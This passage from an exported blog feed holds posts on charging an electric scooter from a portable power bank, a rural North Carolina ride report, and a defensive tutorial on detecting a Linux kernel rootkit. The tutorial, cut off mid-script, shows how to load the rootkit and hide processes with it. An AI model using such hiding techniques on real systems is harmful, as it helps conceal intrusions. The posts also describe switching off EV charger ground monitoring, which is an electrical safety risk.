Early experiments were full of fail\n\n![](https://i.snap.as/2lkNRGdu.jpg)\n\nMy first experiments went poorly: both the BMW (Delphi) EV charger and the Tesla Mobile Connector refused to charge from the Jackery 1000 due to the lack of proper ground. I soon learned that the[ SAE J1772](https://en.wikipedia.org/wiki/SAE_J1772) EV charger specifications required ground monitoring for safety reasons.\n\nThe Jackery 1000 and most other power banks don’t offer a user-accessible ground: the 3rd pin on their sockets is just an empty slot so that a standard 3-prong power cable fits.\n\n### Overcoming the J1772 Grounding Requirement\n\nI tried a number of workarounds, but none of them fooled the EVSE (a fancy acronym for an EV charger cable):\n\n* 3-pin to 2-pin converters\n* Portable GFCI outlets\n* Neutral-Ground Bonding Plugs\n\nI found a Youtube video demonstrating one method to circumvent ground detection, but it seemed overly hacky, bulky, and potentially dangerous. I also contacted the[ EVDOCTOR](https://evdoctor4earth1.weebly.com/) for advice, who recommended that if I opened the Jackery, I’d likely find a metal ground internal.\n\nI had read about some of the cheaper EVSE cables not implementing ground, and the EVDOCTOR hinted that the easiest path forward would be ordering the cheapest EVSE I could and returning it if it implemented ground.\n\nThere is no comprehensive list of EVSE cables that can be used without a ground, but I did find hints suggesting that these may work:\n\n* [Southking SK-EV16](https://www.mynissanleaf.com/viewtopic.php?t=31649)\n* Toyota Prius PHEV cable\n* Honda Clarity PHEV cable\n\n![](https://i.snap.as/Mcm4YXHJ.jpg)\n\nI looked at the cheapest EVSE cables on Amazon and found one that seemed perfect: a 13ft “travel” cord that supported 220V/110V and allowed ground monitoring to be toggled:[ Sankaba Level 2 EV Charger,16Amp EV Charger Station,NEMA 5-20 Plug EV Charger Level 2,100-240v Portable EV Charger](https://www.amazon.com/dp/B0BBPNGPML?psc=1\u0026ref=ppx_yo2ov_dt_b_product_details)\n\nNotably, the ad mentions that there is a “Ground Setting” available:\n\n\u003e After entering the menu, there are two options.\n\n\u003e The device can detect whether the input power supply of the product connected ground wire. If the user's power input is not equipped with ground wire, the device cannot work normally. You should select the second option to connect it.\n\n\u003e For security, it will be ensured that the power input is protected by a ground wire.\n\nI bought the Sankaba, and it works just fine with the Jackery 1000 out of the box. The OEM appears to be \"Ningbo Yiwei New Energy Technology Co., LTD\" with a model number of EV-SAE-AC16-P. This EVSE is also sold under the name of Sunsky.\n\n### Modding the Jackery case\n\nI expected the Jackery 1000 would be barely too tall to fit in the helmet compartment on the CE-04, but I was confident I could remove the top handle if it became a problem. When I received the unit, I learned I was right:\n\n![](https://i.snap.as/zvB63J21.jpg)\n\nI found a[ teardown video](https://www.youtube.com/watch?v=AKxt4eAwKRU\u0026t=238s) for the Jackery and was happy to see that the handle was empty plastic, so I took a hacksaw to it:\n\n![](https://i.snap.as/MHp8Ob11.jpg)\n\nWith that, the Jackery fits just barely in the helmet compartment. I sanded down the leftover corners of the handle to improve clearance and even added a carrying strap.\n\n![](https://i.snap.as/yhAfzJdd.jpg)\n\n### The finished product\n\n![](https://i.snap.as/ngBwOroN.jpg)\n\nOnce assembled, using the Jackery Electric JerryCan is easy:\n\n* On the BMW CE-04, set the maximum amperage to 10A\n* Place the charging brick in the shade to prevent overheating\n* Hit the “AC” button on the Jackery 1000\n* Plug the charging cable in on both ends\n\nIt takes about 45 minutes to fully discharge the Jackery’s battery fully over 110V, adding 750Wh - or about 9.3% charge to the BMW CE-04. Due to the inefficiency of DC-\u003eAC-\u003eDC conversion, you will not get the full 1002Wh. The charge is good enough for emergency use, as it’s enough for this scooter to make it 6 miles (10 km) further to a real charger.\n\nAs the auxiliary battery takes up nearly the entire helmet compartment, I store the EVSE cable in my top case with other emergency tools:\n\n![](https://i.snap.as/mCH3LZOR.jpg)\n\n### Bill of Materials\n\n* Jackery 1000 (1002Wh portable battery): $827\n* Shoulder Dolly HandyLifter Carrying Strap: $13\n* 6-20P to 5-15 adapter: $8\n* Sankaba/Sunsky EVSE L2 Charger (no grounding requirements): $96\n\n### Questions I’ve received\n\n* Why not place the battery in the top case? It’s too heavy: the top case on the CE-04 is only rated to carry 5kg (11 lbs).\n* Can you charge the Jackery 1000 up at an EV charger? Probably with the right adapters, but you wouldn’t want to, as it takes 8 hours to recharge. The newer 1000 Pro charges in 1.8 hours.\n* Is there a 220V option? Yes! I could not find any in the US, but you can buy 220V portable power stations in Europe. They will even charge the CE-04 charge twice as fast!\n\nIf you have any questions, find me on[ Mastodon](https://triangletoot.party/@thomrstrom) or e-mail me at t\u003cAT\u003estromberg.org.","tags":[],"images":["https://i.snap.as/rvh9B0ox.jpg","https://i.snap.as/CTLEu5Y1.jpg","https://i.snap.as/2lkNRGdu.jpg","https://i.snap.as/Mcm4YXHJ.jpg","https://i.snap.as/zvB63J21.jpg","https://i.snap.as/MHp8Ob11.jpg","https://i.snap.as/yhAfzJdd.jpg","https://i.snap.as/ngBwOroN.jpg","https://i.snap.as/mCH3LZOR.jpg"],"paid":false,"full_post_url":"","views":693,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"dgfc7fnvjtbj9mkm","slug":"an-electrifying-ride-to-pik-n-pig","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-05-04T00:41:37Z","updated":"2023-05-04T00:45:47Z","title":"An electrifying ride to Pik N Pig","body":"A few Saturdays ago, I ventured to central North Carolina to join the local ADVrider crew for lunch as part of the confusingly named[ \"Eastern Nc Advrider Dinner\" thread](https://www.advrider.com/f/threads/eastern-nc-advrider-dinner.249043/page-322#post-47574729). I took my trusty [BMW CE-04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html) along - a quirky urban electric scooter (and the most fun I’ve had on two wheels).\n\nWhile the trip was only 138 miles of backroads (an absurd amount for any GS owner), that's a fair journey on a scoot that only averages 62 miles of range in this environment. This trip includes:\n\n* 4 hours of riding\n* 2 hours of charging ($0.86)\n\n![upload_2023-5-3_9-34-28.png](https://www.advrider.com/f/attachments/upload_2023-5-3_9-34-28-png.4812385/)\n\n\u003c!--more--\u003e\n\n**Leg 1: Chapel Hill to Pittsboro**\n_18 miles, 38 minutes riding, 19 minutes charging_\n\nThis particular morning came just after our 16th wedding anniversary, so my wife followed in the cage so we could brunch together.\n\nWhen traveling with an EV, I'll often plan my charging stops at places where I can simultaneously enjoy a great meal so that I can kill two birds with one stone - as well as support the businesses that support my ability to get around. Accordingly, today's destination was \"Cafe Root Cellar\" in Pittsboro, a brunch place often lauded as one of the best in the state, which has two EV chargers up front.\n\nBetween us and brunch is UNC Chapel Hill - the first public university in the United States. The campus is quiet: there are more fans of the original [Versys design](https://www.motorcyclenews.com/bike-reviews/kawasaki/versys-650/2006/) than people milling about at 8 am on a Saturday. Riding past campus, I jump on US Route 15/501, which alternates between an expressway and a surface road.\n\nAfter pulling into the Root Cellar parking lot, I see that my plans are dashed, as they are not open on Saturday mornings. I hopped into Google Maps to find a plan B, and there it was: a small Cafe at a Bed \u0026 Breakfast, aptly named “Small Cafe B and B.”\n\n![PXL_20230415_131745623(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_131745623-1-jpg.4812393/)\n\nThe food here was spectacular, particularly today’s special: Burek.\n\n![PXL_20230415_132634479(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_132634479-1-jpg.4812399/)\n\nIt's a traditional Serbian meat pie, or more specifically, baked phyllo dough stuffed with pork sausage, spinach, potato, caramelized onions, peppers, shredded sheep's milk cheese, garlicky yogurt, and in this case, topped with herb salad.\n\nA burek is typically served for breakfast and made its way to Serbia via Turkey during the Ottoman Empire. Many variations exist depending on where you are - The Turks have \"Börek\", Sephardic Jews have \"bourekas\", and Tunisians have \"[brik](https://en.wikipedia.org/wiki/Brik)\". The only consistent thing is that it's phyllo dough stuffed with savory goodness.\n\n![PXL_20230415_134956109(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_134956109-1-jpg.4812401/)\n\nI never turn down Turkish Coffee when available, and this place delivered. Eventually, though, if I were going to make it in time for the ADVrider lunch and the route I had in mind, I would have to head out. Unfortunately, while leaving out the back entrance onto East St, I had the closest call yet on my scooter.\n\n[![Untitled_Artwork.jpg](https://www.advrider.com/f/data/attachments/4598/4598515-75523004956e1eb7ca651105982d449d.jpg)](https://www.advrider.com/f/attachments/untitled_artwork-jpg.4812403/)\n\nEast St is a busy road. Back when I lived out here 20 years ago, it was known as Highway 64, but that road has since bypassed downtown. I knew there would only be a brief moment in time where the gap was big enough to make a left out of here, so I scooted as far down the gravel driveway as I could. Unfortunately, in doing so, my sight lines were significantly blocked by the two cars that were parked to my left. I looked at the gaps between the trees and the cars, and tried to count how many cars I saw entering and exiting the gaps so that I would know when the gap was close enough to enter.\n\nAfter waiting 5 minutes for it to be clear, I pulled out of the gravel driveway. As I did so, I glanced leftwards and saw a Toyota pickup barreling toward me, 4-6 feet away. I instinctively yanked the throttle to get the hell out of the way and made a graceful left turn, thankful that the CE-04 has plenty of get up and go, particularly at speeds under 35mph.\n\nI was practically shaking afterward. I thought a lot about this situation for the rest of the day. I had suffered a perception error, but how did I miss that pick-up truck? Could I have handled the situation better? Would it have been better or worse if I had made a right-hand turn instead? Even in hindsight, I don’t know the answers to these questions. I know I was thankful to be ATGATT, including an [airbag jacket.](https://helitemoto.com/helite-e-turtle-2-airbag-vest-hivis-electronic-trigger/)\n\n![PXL_20230415_135902664(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_135902664-1-jpg.4812445/)\n\nSince I couldn’t charge during breakfast, I headed to the playfully decorated Chatham Beverage District to top off on my way to Robbins. I arrived there with an estimated 66% of battery and an estimated 44 miles of range, with 38 miles to my next charging stop. My routing software, ABRP, suggested that I charge up to 93% so that I roll into my next stop with 20% of spare capacity, so that’s what I aimed for.\n\n![PXL_20230415_141309710(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_141309710-2-jpg.4812449/)\n\nThe district has a unique history: once the site of one of the largest flower farms on the East Coast, it became the site of a failed aluminum research facility, then a bio-fuels production facility, and eventually a consortium of meaderies, breweries, and distilleries. It also hosts the local farmers market, places to walk around and picnic, and a couple of free EV charging stations.\n\n![PXL_20230415_140246458(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_140246458-1-jpg.4812447/)\n\nCharging from 66% to 93% took 19 minutes. The CE-04 isn’t the fastest charging bike out there (see Energica!), but also not the slowest. Content with the state of charge, I set the BMW navigation mode to “Winding route” and headed southwest toward Robbins.\n\n**Leg 2: Pittsboro to Goldston to Robbins**\n_38 miles, 1 hour of riding, 1 hour of charging_\n\nGoldston is a straight shot via 902 \u0026 Goldston-Pittsboro road: a boring route, but at least the road conditions were good.\n\n![PXL_20230415_144414722(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_144414722-1-jpg.4812485/)\n\nTurning off at Lancaster Dr, I spotted a cemetery behind Goldston Methodist Church, where I noticed a gravestone for Ulysses S. Grant Daurity. I can't imagine how rebellious of a name this must have been in 1874 around these parts. I researched the name to learn more about him but came up empty-handed. It appears that \"Daurity\" is a North Carolina-specific corruption of \"Doherty\" (from the Gaelic O'Dochartaigh).\n\n![PXL_20230415_144643987.MP(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_144643987-mp-1-jpg.4812487/)\n\nI soon arrived in \"downtown\" Goldston, or at least as downtown as you can get in a town with a population of 239. Initially called \"Corinth\", it came into being just 10 years after the aforementioned Ulysses was born. It owes its life to the railroad that runs through it, and is most notable as where Charlie Daniels went to high school before he wrote a song about a devil who went to Georgia.\n\nhttps://www.youtube.com/watch?v=2icMPorsH60\n\nEvidently, there is a mural of him somewhere here, but I missed it. I also missed that the Goldston library has two free EV chargers I could have used instead of wasting my time in Pittsboro. One of the downsides of the decentralized anarchy of EV chargers is that no single website or database has a comprehensive list: the best today is [Plugshare](https://www.plugshare.com/), which did not know about this particular charger until I added it, but \u003chttps://map.openchargemap.io\u003e did.\n\n![PXL_20230415_145503404(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_145503404-2-jpg.4812497/)\n\nOutside of Goldsboro is predominantly agricultural and feels like one bucolic scene flowing into the next. I passed within feet of the center of North Carolina ([35°33'20.5\"N 79°23'15.7\"W](https://www.google.com/maps/place/35%C2%B033'20.5%22N+79%C2%B023'15.7%22W/@35.5429082,-79.4701859,12z/data=!4m10!1m5!3m4!2zMzXCsDMzJzIwLjUiTiA3OcKwMjMnMTUuNyJX!8m2!3d35.5556944!4d-79.3876944!3m3!8m2!3d35.5556944!4d-79.3876944?hl=en)), as per the US Geological Survey. I also passed by signs for the [House-In-the-Horseshoe Historic Park](https://historicsites.nc.gov/all-sites/house-horseshoe) - named after how it sits within the curve of the Deep River, and the site of a Revolutionary War battle. I planned to stop by there on the way home if time permits.\n\nI followed the Deep River west, toward High Falls. There’s a [controversial abandoned dam](https://www.uniqueplacestosave.org/high-falls-dam) there. The dam is impacting an endangered species of fish, but the locals like to fish the dam and have so far resisted its demolition. I saw quite the opposite reaction living in California, where the locals begged to demolish dams to protect fish, and the dam owners dragged their feet.\n\n![PXL_20230415_151006403.MP(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_151006403-mp-2-jpg.4812503/)\n\nPassing over the Deep River, I spotted the High Falls Oil Company. Based on the look of the building, it had been abandoned decades ago. However, Google Streetview shows this building was actively occupied until at least 5 years ago. It seems to have aged like a meth-addicted hillbilly.\n\n![PXL_20230415_152046394(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_152046394-1-jpg.4812513/)\n\nI rolled into the charger at Robbins, NC (hosted by the local electric coop), with 15% left on the battery, according to my pollen-encrusted dash. That's 5% less than my routing software (\u003chttps://abetterrouteplanner.com/\u003e) predicted. I blame speeding, but part of the problem is that ABRP doesn't know the specific characteristics of the BMW CE-04, so I instead tell it I ride a \"Zero SDS ZF 7.2 + PT\" that gets 202 Wh/mi @ 65mph. It's close enough.\n\n![PXL_20230415_152318700(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_152318700-1-jpg.4812515/)\n\nMy goals here were 3-fold: find the charger, find coffee, and find the river to wander around.\n\n![PXL_20230415_152618740(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_152618740-1-jpg.4812521/)\n\nI grabbed a cold brew from \"Simply Coffee\", opened up Google Maps, and spotted a park along the river within walking distance.\n\n![PXL_20230415_160716388(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_160716388-1-jpg.4812525/)\n\nThe town of Robbins was originally named Mechanic's Hill, founded in 1795 when Alexander Kennedy founded a famous rifle manufacturer here: \"[The Kennedy Rifle Works](https://www.thepilot.com/news/features/rifles-of-bear-creek-a-look-at-the-colonial-kennedy-long-rifle-factory/article_fe30303a-3155-11e8-80ba-6fbf4b3f0741.html)\". In its time, it was the largest arms factory in the area. Today, most of us think of mechanics as people who fix things, but initially, the term included the folks who built mechanical things - such as long rifles. Later, the town was known as Hemp.\n\n![PXL_20230415_161532427(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_161532427-2-jpg.4812527/)\n\nWalking into the \"Bear Creek Trail System\", you immediately see the abandoned waterworks building. This building was built in part by the efforts of Karl Robbins, who owned a nearby textile mill. Karl was a prominent philanthropist and did many great things for the town, enough that it renamed itself in his honor in 1943. Karl is also the guy who bought the land to create Research Triangle Park in 1959. He got around!\n\n![PXL_20230415_161135104(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_161135104-1-jpg.4812529/)\n\nAs you take the riparian forest trail further down the hill, the deciduous trees soon give way to canebrake - specifically \"[river cane](https://ebci.ces.ncsu.edu/2020/12/what-is-rivercane-and-why-is-it-important/)\" I had never heard the term \"canebrake\" before moving to North Carolina, but it's used to describe a thicket or colony of native North American bamboo. When the European settlers came, they described endless seas of canebrakes. At the time, much of the Southeast was covered in canebrakes; individual colonies could be thousands of acres large.\n\n![PXL_20230415_161246269(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_161246269-1-jpg.4812531/)\n\nAfter browsing around the river, I figured it was time to get back to the bike, which had charged itself to 96% over the hour I had goofed around Robbins - costing $0.86.\n\n**Leg 3: Robbins to Carthage (ADV lunch!)**\n_18 miles, 35 minutes of riding, 0 minutes of charging_\n\nI headed to Carthage via Plank Rd and Hwy 27, which were that's exciting. Sometimes the \"Windy\" mode on the BMW Connected software delivers, but most of the time the routes are fairly pedestrian.\n\n![PXL_20230415_184537479(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_184537479-1-jpg.4812559/)\n\nDowntown Carthage felt like an old city revitalized, with signs everywhere that harkened back to its distant past. Founded in 1785, Carthage is one of North Carolina's older cities - 7 years older than the current state capital of Raleigh. Its heyday was in the late 19th century when the nearby Tyson Jones Buggy Factory was producing 3,000 horse-drawn buggies a day. The city still hosts an annual [Buggy Festival](https://www.thebuggyfestival.com/) to celebrate its past -- the next one is May 13th, 2023!\n\nI had time to kill, so I rolled by the only EV charger I knew of in town, at Cooper Ford, a couple of miles south. The charger was in use by a shiny new 2023 Ford E-Transit Van with a battery that was 8X the size of my own, so I figured it might be parked there for a while \u0026 headed to the [Pik N Pig.](http://www.pik-n-pig.com/)\n\n![PXL_20230415_170233411.MP(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_170233411-mp-1-jpg.4812563/)\n\nLocated at Gilliam-McConnell Airfield, the Pik N Pig advertises itself as the best BBQ in North Carolina. I’m not yet convinced, but it’s at least the best BBQ that you can fly an airplane to and from. I navigated through a sea of parked cars and motorcycles, looking for vaguely ADV'ish bikes - and soon spotted [GordonFreeman](https://www.advrider.com/f/members/gordonfreeman.172284/) on his beautiful KTM 1290R. [Iron Cross Junction](https://www.advrider.com/f/members/iron-cross-junction.288805/) pulled in behind me on his Guzzi; though he swore up and down he wasn't here for an ADV lunch.\n\nI soon realized we needed a better way of identifying who else was with the ADVrider community, other than accosting anyone with a vaguely dual-sport bike or Klim gear. I regret not bringing my shirt. It took 30 minutes for a table to free up, and one by one, we found other folks: [truck6driver](https://www.advrider.com/f/members/truck6driver.70414/), [MiniMe](https://www.advrider.com/f/members/minime.387668/), [Frankencycle](https://www.advrider.com/f/members/frankencycle.285993/), [Turbo Ghost](https://www.advrider.com/f/members/turbo-ghost.107014/), and some others whose names I've since forgotten.\n\n![PXL_20230415_183245166(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_183245166-2-jpg.4812565/)\n\nWe talked a lot about guns, our experiences with the military, and the dumb things people do on two wheels. I'm not much into guns, but I know a lot about dumb things on motorcycles. Watching the planes coming in and out was like observing a conveyer belt of privilege - though I probably shouldn't talk as someone rolling in on a BMW.\n\n![PXL_20230415_175533536(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_175533536-1-jpg.4812569/)\n\nThe pulled pork \u0026 sauce were good, but not delicious to the point of going out of your way to get there. It's mostly hype. Still, the company was excellent. Judging by other people's plates, I'll order the brisket \u0026 Pepsi-Cola cake next time. After hanging out for an hour and a half, I needed to head out - I was supposed to be back by 4 pm to make it in time for a party and had at least an hour ride and a 30-minute charge ahead. Before leaving Carthage, I got one last photo of my bike downtown, complete with muddy boots:\n\n![PXL_20230415_184549389.PORTRAIT(3).jpg](https://www.advrider.com/f/attachments/pxl_20230415_184549389-portrait-3-jpg.4812573/)\n\n**Leg 4: Carthage to Sanford**\n_20 miles, 47 minutes of riding, 37 minutes of charging\n\n![PXL_20230415_185502228.PORTRAIT.ORIGINAL(2).jpg](https://www.advrider.com/f/attachments/pxl_20230415_185502228-portrait-original-2-jpg.4812615/) _\n\nI set the BMW navigation app to \"Winding route\" again and set my sights toward Sanford. I know from experience that Downtown Sanford Horner Square has a wonderfully convenient and free charger, and from here, I'm going to need a charge to get back home.\n\n![PXL_20230415_190426014.PORTRAIT.ORIGINAL(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_190426014-portrait-original-1-jpg.4812623/)\n\nThe roads here (Old River Rd, Torchwood Rd) are my favorite of the day. They rhythmically wind through the picturesque pastoral landscape. Before long, I'm in suburban hell, which eventually opens up into the charming brick shape of Sanford.\n\n![PXL_20230415_192752625(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_192752625-1-jpg.4812625/)\n\nSanford is a surprisingly charming town. It’s yet another town born of railroads, but brick-making also played a massive role in its success. Nearly every building downtown is made from brick, and many have beautiful murals too. There are numerous lively and accessible local businesses, which give Sanford a hipper feel than most of the towns in rural North Carolina. It's still \"Country enough\" that the rural 20-somethings can be easily found revving and racing down Horner Blvd.\n\nAs much as I love the concept of a free EV charger, this location epitomizes the problems of misplaced incentivization:\n\n* One charger is always in use by the same black Tesla Model 3. Probably an employee of a local shop.\n* One charger has been half-broken for over a year.\n\nThe half-broken charger is workable for many vehicles, but only if you know to depress the broken J1772 latch while plugging it into your vehicle. Thanks to [Plugshare](https://www.plugshare.com/location/116454), I knew that. This trick apparently won't work for Tesla's, however.\n\n![PXL_20230415_192629404.MP(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_192629404-mp-1-jpg.4812629/)\n\nOn my way to my favorite coffee shop, I passed by the Lee County Republican Headquarters, which has the sort of fear-mongering signs you've come to expect from the Republican Party of 2023. My usual coffee place was closed, so I grabbed an iced coffee from a place I had not tried before, Family Grounds Cafe. Nearby I found another great mural - you can't go more than a block in Sanford without stumbling onto one:\n\n![PXL_20230415_194727275(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_194727275-1-jpg.4812631/)\n\nFeeling caffeinated and I head back to my bike, and see that it charged from 26% to 76% over 37 minutes. That’s 13% more than I need to get home, so I set the BMW routing software to \"Fastest\" and look forward to getting home directly via 15-501.\n\n**Leg 5: Sanford to Chapel Hill (The Final Leg!)**\n_39 miles, 75 minutes riding, 5 minutes charging_\n\nA couple of miles down the road, I blindly follow the GPS instructions onto US-1, a 70mph road. \"Fuck!\". I didn't plan on those sort of speeds. You see, needlessly high-speed travel is bad news on an electric vehicle. The energy required to overcome wind resistance has a cubic relationship with velocity:\n\n_**energy required = 0.5 \\* density_of_air \\* velocity^3 \\* drag coefficient \\* surface area**_\n\nFor example, Increasing speed from 62mph (100km/h) to 68mph (110km/h) can increase energy consumption by 33%. You don't notice this in a gas vehicle so much, as they are incredibly inefficient at low speeds. In something like a Tesla, you don't notice either as it's drag coefficient \u0026 surface area is low, and it's battery is huge. I nervously watched as the “estimated range” number on the dash inched closer to the “distance to destination” number.\n\n![PXL_20230415_200946460.MP(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_200946460-mp-1-jpg.4812675/)\n\nBy the time I pulled off the highway at Moncure, the two numbers were only 1 mile apart: 27 miles from my destination with only 28 miles of range left. Without a full charge, there was no way I would make it if I stayed on US-1. Moncure is a tiny town the middle of nowhere, but amazingly the Exxon station in town has an EV charger. It is however a more modern \u0026 faster DC-based charger, whereas the BMW CE 04 only supports AC-based charging. Supporting only a single charging technology makes sense for BMW, as this scoot was designed as a \"charge overnight\" commuter rather than a long-distance touring bike. Thankfully, the planning websites I use filter out incompatible chargers, so I didn't have to visit it in person to suffer disappointment.\n\n![Screenshot_20230415-160949(2).png](https://www.advrider.com/f/attachments/screenshot_20230415-160949-2-png.4812681/)\n\nAfter changing the rI was reasonably confident that as long as I stayed off the highways, I wouldn't have a problem getting home without a change, so I changed the BMW routing algorithm to \"Efficient\", and it directed me to a route that hugs the western coast of Jordan Lake. The roads here are empty - I only see a car every 5 minutes or so. I drop down to about 40 mph to conserve my range, as I know that the energy required to overcome wind resistance has a cubic relationship with velocity:\n\nOn these chill, shady back roads, I passed by many entrances to Jordan Lake and the Carolina Tiger Rescue before briefly ending up on US-64 until I could turn off onto Gilead Church Rd, which I followed back to 15-501 near Fearrington (a pastoral yuppy enclave). Being familiar with this area, I knew I would pass by the Chatham Health Sciences Center, which has an incompletely configured charger that was still not technically open. I had previously read from the Plugshare site that if you went to the language selection screen on these Chargepoint chargers, you could unlock the otherwise inoperable chargers. It's worth a try!\n\n![PXL_20230415_204706348(1).jpg](https://www.advrider.com/f/attachments/pxl_20230415_204706348-1-jpg.4812689/)\n\nI rolled to the charger with a 22% charge, so I just did a 5-minute top-off to 32% and headed home, not nearly as nervous as I was before. I arrived with a 16% charge and 11 miles of estimated range. Without that final charge, I would have been able tot arrive home at 6%, but with significantly more anxiety and less attention to the road.\n\nI hope y'all now have a feel for what it's like to tour a rural area with a small-battery electric vehicle. Much like bicycle touring, it requires planning and patience. However, it also allows you to see things you would typically scoot right by - from the Chatham Beverage Center to the Canebrakes of the Deep River. **Improvise. Adapt. Overcome.**\n\nI wouldn't trade this ride for any other currently available vehicle - though if BMW ever releases a CE with support for DC fast charging and 25% more range, I'd jump on it immediately.","tags":[],"images":["https://www.advrider.com/f/data/attachments/4598/4598515-75523004956e1eb7ca651105982d449d.jpg"],"paid":false,"full_post_url":"","views":195,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"n4bgp8pnm0h02f4l","slug":"diy-linux-kernel-rootkit-detection","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-03-04T16:48:49Z","updated":"2023-03-13T12:43:01Z","title":"DIY Linux Kernel Rootkit Detection","body":"![](https://i.snap.as/uzmvIJhe.jpg)\n\nToday I will teach you how to roll your own detection of a classic Linux kernel rootkit using shell scripting (for explanation) and osquery (for production).\n\nYour chance of encountering a Linux kernel rootkit in the wild is slim due to compatibility and distribution challenges, so this explanation is geared toward the most paranoid folks in the audience. For this demonstration, we'll use [reveng_rtkit](https://github.com/reveng007/reveng_rtkit) - one of the more modern examples of a Linux rootkit.\n\nAs of February 2023, this reveng_rtkit runs well on Debian, so I used [lima](https://github.com/lima-vm/lima) with `limactl start template://debian` to create my test environment.\n\n\u003c!--more--\u003e\n\n## How does one detect a rootkit anyways?\n\nThe trick to detecting a rootkit is to find cracks in the illusion they present. Most rootkits only hide their presence when probed with a specific syscall, but Linux has [hundreds of syscalls](https://filippo.io/linux-syscall-table/) to choose from. Most commonly, Linux rootkits will hide processes or directory entries by overriding [getdents(2)](https://man7.org/linux/man-pages/man2/getdents.2.html), but neglect [stat(2)](https://man7.org/linux/man-pages/man2/stat.2.html). Some rootkits hide file contents by overriding [read(2)](https://man7.org/linux/man-pages/man2/read.2.html), but forget about [mmap(2)](https://man7.org/linux/man-pages/man2/mmap.2.html).\n\n## Collecting Evidence\n\nCollecting the state of a system before and after a malware installation is an easy way to determine what attributes to alert on.\n\nIf you are only concerned about filesystem changes, many methods are available, such as [Sleuthkit](https://www.sleuthkit.org/) or [hashdeep](https://github.com/jessek/hashdeep). Fewer choices exist if you are concerned about the larger overall system state.\n\nSince I work on the \\[osquery-detection-kit,\\]((https://github.com/chainguard-dev/osquery-defense-kit project) I’ll use it to collect a subset of system information to a file. osquery-detection-kit does require extremely recent versions of Go and osquery to be installed, so here's how I installed the dependencies:\n\n```shell\narch=$(uname -m | sed -e s/x86_64/amd64/g -e s/aarch64/arm64/g)\ncurl -L https://go.dev/dl/go1.20.1.linux-${arch}.tar.gz | sudo tar -C /usr/local -zxvf -\ncurl -LO https://pkg.osquery.io/deb/osquery_5.7.0-1.linux_${arch}.deb\nsudo dpkg -i osquery_5.7.0-1.linux_${arch}.deb\nexport PATH=/usr/local/go/bin:$PATH\n```\n\nHere's how I collected the data:\n\n```shell\ngit clone https://github.com/chainguard-dev/osquery-defense-kit\ncd osquery-defense-kit\ngit pull\nmake collection\n```\n\nThis will populate a subfolder named `out/` with evidence, so that we may compare against it later.\n\n## Installing The Rootkit\n\nI followed the instructions on \u003chttps://github.com/reveng007/reveng_rtkit\u003e to install the rootkit. Here's how I loaded it:\n\n```shell\nsudo insmod reveng_rtkit.ko\n```\n\nAfterward, `sudo dmesg` shows:\n\n```log\n[  382.584069] [+] reveng_rtkit: Created by @reveng007(Soumyanil)\n[  382.584070] [+] reveng_rtkit: Loaded\n[  382.584071] [*] reveng_rtkit: Hiding our rootkit LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path\n```\n\n## Finding System State Differences\n\nNow I'm able to collect system state once again and diff the two:\n\n```shell\ncd $HOME/osquery-defense-kit\nmake collect\ndiff -ubR ./out/\u003cold\u003e ./out/\u003cnew\u003e\n```\n\nThe first thing that stood out was that one of the sysctl's changed:\n\n```diff\n-config_value: current_value:0 name:kernel.tainted oid: subsystem:kernel type:string\n+config_value: current_value:12288 name:kernel.tainted oid: subsystem:kernel type:string\n```\n\nThe rootkit uses `kill -31` to hide processes, so I used `kill -31 $$` to hide my shell process, ran the collection, and ... found no further differences. This means I'm going to have to improve our detection scripts.\n\nFor testing, I also started a `sleep 7200 \u0026` process in the background from the hidden shell. This rootkit also hid this subprocess - not all are so consistent.\n\n## Detecting hidden pids\n\nKernel rootkits tend to do two things with varying levels of success: hide their kernel module, and hide a process ID. revenge_rtkit does this by hiding getdents() calls to /proc, but if you know the hidden process ID, you can stat it directly. Ironically, this is also how Linux hides lightweight threads from users.\n\nFor most of Linux's life, the maximum number of pids on a system was 32768, a relatively small area to stat. Most modern Linux distros have bumped this number up, so this process is going to be slow. To check your system's maximum pid number, run `cat /proc/sys/kernel/pid_max`.\n\nHere's a shell script that iterates through all possible pid numbers, revealing any that were not found when listing /proc: \\[[full source](https://github.com/tstromberg/sunlight/blob/main/hidden-pids.sh)\\]\n\n```shell\n[[ $EUID != 0 ]] \u0026\u0026 echo \"* WARNING: For accurate output, run $0 